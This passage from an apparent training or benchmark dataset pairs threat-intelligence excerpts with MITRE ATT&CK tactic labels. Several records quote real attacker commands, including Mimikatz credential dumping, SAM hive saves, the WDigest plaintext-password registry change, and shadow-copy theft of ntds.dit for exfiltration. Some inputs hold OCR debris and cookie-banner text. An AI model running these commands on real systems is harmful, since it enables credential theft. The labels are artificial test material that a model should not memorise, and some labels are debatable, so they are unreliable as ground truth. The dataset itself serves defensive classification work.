        "input": "Described attack activity: APT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the KEYPLUG backdoor leveraged dead drop resolvers on two separate tech community forums. The malware fetches its true C2 address from encoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden. \nTo persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10. \nAPT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions: \nAnother technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11. \nAPT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE. During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory. The identified \nLOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints: \nhttp://<HOST:PORT>/USAHerds/Common/%s.css https://<HOST:PORT>/USAHerds/Common/%s.css \nAPT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server. ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019. To this point, all discovered samples of this malware have targeted only macOS. The malware employs multiple levels of obfuscation and is capable of privilege escalation. Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities. Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads. The following analysis results reflect execution of a DMG-based payload. \nNote: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software  these variations may have different application paths. The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.\u202fThe samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL. This is an important distinction for detection, as the 0 (force http 1.0) argument is not generally used legitimately, whereas usage of  s (silent) and $-S$ (show errors) is more common. \nThe following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation: \nAs referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file. The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below: \nFigure 6: Fake Flash Update Installer \nWhen this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume. This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed. A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.\u202fAlthough the format and sequence of these scripts vary among samples, the basic overall  execution chain remains the same. ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After execution of the initial access malware, many threat actors deploy persistence mechanisms, such as the creation of scheduled tasks, deployment of web shells, remote access software and registry \"Run\" Keys.\nScheduled Task Example (reference)\nAdd New User Example (reference)\nRegistry Run Key Example (reference)\nIn 14 of 20 cases, persistence was observed. Scheduled tasks were the most common persistence method observed in our intrusions. In most, if not all cases, scheduled tasks, bits-jobs, and registry run keys were executed from the initial malware vector. When we look at the later stages of the attack, during post-exploitation activities, we can see that the threat actors favor new user additions and third-party remote access software as the main persistence techniques.\nIn some cases, we did not observe any typical form of persistence during the entire intrusion. However, we found that these threat actors seem to prefer to broaden their access throughout the network by launching several Cobalt Strike beacon sessions. In this way, they can maintain their presence even if one or more compromised workstations become inaccessible. Servers are often chosen during this beacon deployment phase, which is more likely to remain online compared to a typical workstation.\nAnother common method observed to maintain access is by installing third-party remote access software such as AnyDesk, TeamViewer, Splashtop and Atera. An interesting observation is that the majority of this activity occurred on compromised domain controllers.\nHere's an example from theConti Leaksthat show the process of how they install AnyDesk:\nThis AnyDesk activity was also observed in ourDiavol Ransomwarecase.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn't attempted any previous logins. The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password. The threat actor used a workstation named winstation. During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Attackers target the weakest link in an organization's defenses. They look for an initial compromise to get in, and once inside will look for a variety of ways increase the scope and impact of the breach. They typically achieve this by trying to compromise other users, moving laterally within the organization, elevating privileges when possible, and the finally reaching a system or data repository of critical value. As they proliferate through the organization, they will touch different endpoints, identities, mailboxes and services. \nReducing the impact of such attacks requires quick detection and response. And that can only be achieved when the defenses across these systems do not act in silos. This is why it is critical to have an integrated view into security solutions. Look for an email security solution that integrates well across other security solutions such as endpoint protection, CASB, identity protection, etc. Look for richness in integration that goes beyond signal integration, but also in terms of detection and response flows. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bumblebee uses a Cobalt Strike agent for lateral movement. We can see multiple connections from the process to internal addresses on Remote Desktop Protocol (RDP), on TCP port 3389: \nBumblebee lateral movement from Cobalt Strike agent as seen in the Cybereason Defense Platform \nFollowing the lateral movement, the attacker persists on the organization network using the remote management software \"any desk\": \nBumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. \nntds.dit file from the domain controller. \nThe ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership. The file also stores the password hashes for all users in the domain: \nBumblebee creates shadow copies on remote Active Directory server and exfiltrates Ntds.dit as seen in the Cybereason Defense Platform \nThe following are the commands related to credential theft used to escalate privileges on the Active Directory: \n\u200bwmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user name]\" /password:\"[Compromised user password]\" process call create \"cmd /c vssadmin create shadow /for $\\scriptstyle=C$ $2{>}\\&1^{\\prime\\prime}$ \nwmic /node:\"[Active Directory IP address]\" /user:\"[Compromised user \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. \nc:\\ProgramData\\nt & copy \\\\?   \n\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy635\\Windows\\System32\\config\\SECURITY   \nc:\\ProgramData\\nt\" \n7za.exe a -mx3 nt.7z \\\\[Active Directory IP address]\\c\\$\\ProgramData\\nt \nIn order to obtain maximum privileges on the Active Directory domain, the threat actor: \nCreates a shadow copy of the machine file's volume Lists all available shadow copies and stored the result in a file. Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy. Compress the output directory for exfiltration. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.\nShortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat. This has been observed multiple times by different ransomware groups. The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.\nThe second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.\nOn the second day, the following commands were executed before they started working on moving laterally in the domain.\nDuring the course of the intrusion, we observed execution of the utility \"Advanced IP Scanner\" to perform network scanning (over ports 21,80,445,4899,8080).\nAdvanced IP Scanner was downloaded using Internet Explorer on a server:\nand then run with the portable option:\nWe also saw \"MSSQLUDPScanner.exe\" used for discovery of MSSQL instances across the environment.\nWe believe the tool used isrvrsh3ll'sMSSQLUDPScanner\nComparing compiled version to executable from this intrusion\nBefore execution of AdFind.exe, adf.bat was run.\nVia RDP they manually ran@carlos_perez'sInvoke-Sharefinder.ps1on a server. It then looks like they manually copied the output to a file named shares.txt.\nAfter each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker installed and used Python 2.7 to execute the smtp cracker script.\nPip was used to install 4 modules.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: When it comes to defense evasion, we noticed that process injection techniques were very common among threat actors. This allows them to establish additional Beacons on the already compromised hosts, to avoid detection.\nIn five separate cases, we encountered threat actors disabling security tools using various methods. One of the most notable cases was theIcedID to XingLocker Ransomware in 24 hourscase. In that case, the attackers used multiple batch files to disable well-known AV and EDR agents on the host. The batch scripts came from the first revision ofRevisions ` quick-disable-windows-defender.bat ` GitHub, which was used by the ransomware operators without making any changes.\nMasquerading Example (reference)\nObfuscation Example (reference)",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1098: Account Manipulation T1543.003: Windows Service T1547.001: Registry Run Keys / Startup Folder T1547.009: Shortcut Modification Impact T1489: Service Stop T1529: System Shutdown/Reboot ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed byMandiantandSophos) being used to install themselves to removable disks and create a reverse shell.",
        "output": "lateral movement",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches [T1593]-including victim-owned sites [T1594]-for victim host [T1592], identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff [T1589.002] post compromise. \nResource Development \nHistorically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure [T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-oflife SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See DOJ press release U.S. Government Disrupts Botnet People's Republic of China Used to Conceal Hacking of Critical Infrastructure for more information). ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor had a copy of LockBit ransomware in the directory .local\\LB3.exe and in the bash history of the host there were two RAR files they had deleted:\nWhile the archives no longer existed for us to analyze, we assess with moderate confidence that these were copies of the previously leaked LockBit Black ransomware builder.\nTriage Sandbox run screenshot of .local\\LB3.exe:\nRansom note presented after executing the LB3.exe binary:\nWhen analyzing the left behind LB3.exe binary, the following ransomware note is created upon execution:\nThe telegram channel mentioned is hXXps://t.me/You_Dun. Further analysis of this group is discussed in theAdversarysection.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After I reversed the malware, especially the part that handles the C2, I wanted to discover whether this campaign was still up and running. \nI set up a brand new virtual machine, downloaded Tor and started looking for an IRC client that supports SOCKS5, the proxy protocol that is needed in order to connect through Tor. IRC is a very old protocol and is less popular today than it was 20 years ago. Furthermore, IRC came out almost a decade before SOCKS5. I found HexChat, a simple, lightweight IRC client that supports both SOCKS5 and connecting to onion domains. \nWhen our Silospace sample was originally executed, its command line argument for the IRC username was php_35, so I decided to use this username when connecting to the C2 server from HexChat, thinking it would appear legitimate to the attacker. \nI connected to the server and discovered it was still working. I joined #WindowsKubernetes just like Siloscape does. There were 23 active victims there and a channel operator named admin. \nUnfortunately, after about two minutes, I was noticed and kicked out of the server. Two minutes after that, the server was no longer active  at least not at the origina onion domain I used. ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exchange servers contain the most sensitive users and groups in an organization. Gaining credentials to these accounts could virtually give attackers domain admin privileges. \nIn our investigation, the attackers first dumped user hashes by saving the Security Account Manager (SAM) database from the registry. \nCmd.exe/c cd /d C:\\PerfLogs\\&reg save hklm\\system C:\\Windows\\debug\\WIA\\system.hive 2>&1&echo[S]&cd&echo[E] \nNext, the attackers used the ProcDump tool to dump the Local Security Authority Subsystem Service (LSASS) memory. The dumps were later archived and uploaded to a remote location. \nIn some campaigns, attackers dropped Mimikatz and tried to dump hashes from the server. \ncmd.exe /c cd /d C:\\PerfLogs\\&instal1 \"1sadump::sam\"&echo {S}&cd&echo {E} cmd.exe /c cd /d C:\\PerfLogs\\&instal1 \"1sadump::lsa/patch\"&echo{S}&cd&echo{E} cmd.exe/c cd /d C:\\PerfLogs\\&install \"sekurlsa::logonpasswords\"&echo {S}&cd&echo{E} cmd.exe/c cd /d C:\\PerfLogs\\&install \"sekurlsa::wdigest\"&echo{S}&cd&echo{E} cmd.exe /c cd /d C:\\PerfLogs\\&install \"sekurlsa::tspkg\"&echo{S}&cd&echo{E} \nIn environments where Mimiktaz was blocked, attackers dropped a modified version with hardcoded implementation to avoid detection. Attackers also added a wrapper written in the Go programming language to make the binary more than 5 MB. The binary used the open-source MemoryModule library to load the binary using reflective DLL injection. Thus, the payload never touched the disk and was present only in memory, achieving a fileless persistence. \nThe attackers also enabled 'wdigest' registry settings, which forced the system to use WDigest protocol for authentication, resulting in lsass.exe retaining a copy of the user's plaintext password in memory. This change allowed the attacker to steal the actual password, not just the hash. \ncmd.exe $\\prime c$ cd /d C:\\PerfLogs\\&reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest $\\scriptstyle\\slash\\lor$ UseLogonCredential $\\alpha$ REG_DWORD/d 1/f&echo[S]&cd&echo[E] \nAuthentication Id :0;970221 (00000000:000ecded)   \nSession :Interactive from 1   \nUser Name   \nDomain :VM1   \nLogon Time :5/27/202012:14:48PM   \nSID :5-1-5-21-4043002834-2453320586-1181570479-1001 [00000003] Primary :VM1 kerberos : :VM1 credman : \nAnother example of stealthy execution that attackers implemented was creating a wrapper binary for ProcDump and Mimikatz. When run, the tool dropped and executed the ProcDump binary to dump the LSASS memory. The memory dump was loaded inside the same binary and parsed to extract passwords, another example of reflective DLL injection where the Mimikatz binary was present only in memory. \n[+] Creating the snapshoot of lsass.exe \nWith attacker-controlled accounts now part of Domain Admins group, the attackers performed a technique called DCSYNC attack, which abuses the Active Directory replication capability to request account information, such as the NTLM hashes of all the users' passwords in the organization. This technique is extremely stealthy because it can be performed without running a single command on the actual domain controller. ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of 152.exe, Hijackloader established persistence on the beachhead system by the creation of a startup entry:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The phishing email with the malicious attachment is shown in Figure 2. It is disguised as an account confirmation request. The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file. The PE header is shown in Figure 3.\nThe execution file is a Python program packaged by PyInstaller. We extracted it with pyinstxtractor and found that the \"PYARMOR\" string in its main code file \"contain.pyc\", shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected. We extracted the key and iv from _pytransform.dll and decrypted the \"contain.pyc\" using AES-GCM.\nIn addition to the Python program, we observed a .NET loader that can extract EvilExtractor. Figure 5 is part of the code. It contains Base64-encoded data, which is a PowerShell script. This execution file is generated from the tool \"PS2EXE-GUI\", which can convert PowerShell scripts to EXE Files.",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The particular point of interest in this campaign is the effectiveness of the TTP's at bypassing many security tools. In the delivery stage the campaign uses compromised email accounts to inject into previous conversations by adding a link and imploring the recipient to check the latest update to the ongoing conversation.\nThe link provided is to a Google Drive account, a trusted entity to users, and often not capable of being blocked in many enterprises. The Google Drive link downloads a password protected zip file with a javascript (JS) file inside.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this blog post, we will go over Storm-0501's tactics, techniques, and procedures (TTPs), typical attack methods, and expansion to the cloud. We will also provide information on how Microsoft detects activities related to this kind of attack, as well as provide mitigation guidance to help defenders protect their environment. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: QBot was observed injecting into msra.exe process on multiple systems.\nMultiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected. The newly dropped dll was then executed and process injected into msra.exe.\nQbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.\ndll files dropped by Qbot, were deleted after injection into msra.exe.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pool such as minergate[.]com.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We were able to identify several victims in this Operation AppleJeus sequel. Victims were recorded in the UK, Poland, Russia and China. Moreover, we were able to confirm that several of the victims are linked to cryptocurrency business entities. \nThe actor altered their macOS and Windows malware considerably, adding an authentication mechanism in the macOS downloader and changing the macOS development framework. The binary infection procedure in the Windows system differed from the previous case. They also changed the final Windows payload significantly from the well-known Fallchill malware used in the previous attack. We believe the Lazarus group's continuous attacks for financial gain are unlikely to stop anytime soon. \nSince the initial appearance of Operation AppleJeus, we can see that over time the authors have changed their modus operandi considerably. We assume this kind of attack on cryptocurrency businesses will continue and become more sophisticated. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To establish persistence in the network, multiple scheduled tasks and Windows services were created on the beachhead and one of the domain controllers. They reference the files dropped on the compromised hosts and Tor2Mine servers.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Using PowerShell the threat actors issued several commands to impair Windows Defender including:\nWindows Defender Behavior Monitoring was disabled. \nThe Severe Threat default action was set to 'Allow'. \nRealtime Monitoring was disabled. \nThe 'C:\\Windows' path was excluded from scheduled and real-time scanning.\nA rule was added to the Windows Firewall to allow remote RDP traffic.\nRemote Desktop Services was started.\nThe threat actor enabled WDigest authentication. This enforces the storage of credentials in plaintext on future logins.\nLSA protection was disabled.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We found the presence and execution of the network discovery tool NetScan being used by the threat actor to perform network enumeration using the following file names: \nnetscan.exe (SHA256:1b9badb1c646a19cdf101ac4f6fdd23bc61eaab8c9f925eb41848cea9fd073 8e) netapp.exe (SHA256:1b9badb1c646a19cdf101ac4f6fdd23bc61eaab8c9f925eb41848cea9fd073 8e) \nAdditionally, execution of AdFind (SHA-256: f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e), an Active Directory reconnaissance tool, was observed in the environment. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ScreenConnect\nThere are many techniques to detect the execution of user-downloaded executables. While some effective techniques rely on the presence of a MOTW (Mark of the Web), simply reviewing programs started from within the user's%USERPROFILE%\\Downloadsfolder is a common and effective technique. The execution of such downloads can be observed through both the default security event4688(A new process has been created) as well as Sysmon's event1(Process creation).\nOnce executed, the malicious dropper staged a Windows Installer File (*.msi) within the user's%TEMP%directory and proceeded with the execution of the installer throughmsiexec.exe, as seen in the following Sysmon event1. Once this installer executed, the maliciousdocument8765.exeprocess terminated.\nThe absence of the/qdisplay optionsresults in the installer being user-visible. This can be observed in sandbox executions such as in the \"Replay Monitor\" fromRecorded Future's TriageSandbox.\nUpon execution, the malicious installer deploys a legitimate instance of theScreenConnectRMM software. As part of this installation process, additionalmsiexec.exeandrundll32.exeinvocations took place, details of which are omitted due to being part of the legitimate ScreenConnect installer. Most notably, ScreenConnect was installed within the%ProgramFiles(x86)%\\ScreenConnect Client (0e2f8d025e383f56)\\subdirectory, where0e2f8d025e383f56is an installation thumbprint.\nScreenConnect persistence as well as related command & control mechanisms are discussed in later sections.\nOnce the ScreenConnect channel was established, the threat actor was able to execute additional commands through the RMM utility's built-in features. For ScreenConnect, command execution is performed by dropping the desired script on disc, followed by its execution through the appropriate interpreter (Command Prompt or PowerShell). This mechanism provides numerous detection opportunities through Sysmon's event11 (file create);as well as, upon execution, the Security event4688or Sysmon event1, displayed hereafter.\nAs part of these executed commands, multiple discovery actions were carried out; these are further documented within the discovery section. Additionally, the threat actor was seen attempting to execute additional PowerShell scripts.\nOne of the commands issued through ScreenConnect was the deployment of Cobalt Strike through a PowerShell stager, one hour 22 minutes into the intrusion.\nBy relying on plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.\nSimilar to the above Cobalt Strike stager, a second attempt was made using the following command.\nHere again, by relying on plain HTTP, the actor exposed the PowerShell payload.\nAs Cobalt Strike beacons load themselves into memory, we can extract the associated configuration using tools such ascobaltstrike-config-extractor.\nAbout 40 minutes later, two hours and seven minutes into the intrusion, the threat actor leveraged another stager based onSystem.Net.WebClient'sDownloadFilefunction to drop%temp%\\P6nqEdwk.exe. This trojanized executable was downloaded fromhttp://94.232.43[.]201:8080/dQhNZOV3Qmand subsequently executed.\nSysmon's process creation event1(or alternatively the Security event4688) captured the parent-child relationship as shown below.\nUpon inspection, the trojanized executable seems based on ApacheBench 2.3, a legitimate HTTP benchmarking utility.\nThe ApacheBench executable has, however, been modified to embed an additional PowerShell payload.\nUpon execution of the ApacheBench executable, the PowerShell payload gets executed.\nWhen decoded, the payload is a configuredPowerfun reverse-shell believed to be part of Metasploit(due to its usage of the default port4444). This specific format of the PowerShell reverse shell wasintroduced in version v4.11.7(May 19, 2015), suggesting the threat actor partially relies on outdated tooling. The script was latermodified in v6.3.23(Nov 30, 2021).\nOnce connected with94.232.43[.]201:4444over TCP, the threat actor leveraged the reverse shell to execute the two slightly different encoded PowerShell stagers. Based on the timestamps between process creations, as well as the presence of credibleWerFault.exeprocess trees, we believe with medium confidence the first process crashed multiple times after eight minutes, forcing the threat actor to re-start the stager.\nWhile both of these commands vary in obfuscation, they ultimately execute the same following shellcode.\nThis shellcode acts as a stager that downloads a payload from a websocket established with94.232.43[.]201:4433. Analysis of similar shellcode as well as its API hashing algorithm (incl. rainbow table) has beendocumented by NVISO.\nThere are several tools available to assist with analyzing shellcode, one of which isscdbg. This tool has the ability to analyze code and provide useful information regarding its functionality. By using scdbg to analyze the shellcode, we can obtain the necessary remote server's host and port.\nAs is the case for plain HTTP, plain websockets allow for network communications to be intercepted. To that extent, the websocket stager retrieves the payload's size (0x02b043in little endian) followed by the payload itself.\nWhen extracted, the payload matches two YARA rules from Florian Roth detectingreflective loadersas well asin-memory Meterpreter.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The following net commands were used by the threat actor from the injected Trickbot process.\nThe followingnltestcommands were used by the threat actor from the injected Trickbot process.\nPowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.\nThe local network was scanned for port 445/SMB.\nipconfig was used to show all IP info.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime. This is the contents of that batch file.\nThis script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker gathers the victim's system and user information and also checks the time synchronization by remotely executing the following commands on the victim machine. \nwhoami /all dir net time ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To obtain SYSTEM privileges, the threat actor executed the getsystem Cobalt Strike functionality multiple times.\nWe saw the threat actor use variations of this which indicates likely getsystem activity:\nThis technique was thoroughly described here:\nSEO Poisoning to Domain Control: The Gootloader Saga Continues\nWhen the threat actor created the new user account, they also also added that new account to a privileged active directory group.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\nAs we saw from the execution section,dar.dllwas used to contact the below domains:\ndilimoretast[.]com \n138[.]68.42.130:443\nantnosience[.]com \n157[.]245.142.66:443\noceriesfornot[.]top \n188[.]166.154.118:80\nCobalt Strike\n185.203.118[.]227 \nWatermark:305419776",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The following commands were executed via the Confluence RCE:\nFrom the Meterpreter session, tasklist was used to enumerate the running processes. This threat actor identified C2 processes that were established by a different actor and used 'taskkill' to end them.\nDuring this task, we noticed a threat actor blunder: the 'taskkill' execution on 'powershell.exe' killed their own Meterpreter session. Consequently, they re-exploited Confluence to establish yet another Meterpreter session. Then, further discovery commands were executed on the host:\nNetScan was then utilized to enumerate the local network:\nWhen NetScan is executed with the 'Check for write access' option enabled, a 'delete.me' file is created then deleted on discovered shares. We can observe this in Event ID 5145:\nAfter moving to a Domain Controller, 'query user' was once again executed. Then the Domain Admins group was enumerated, after a typo:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
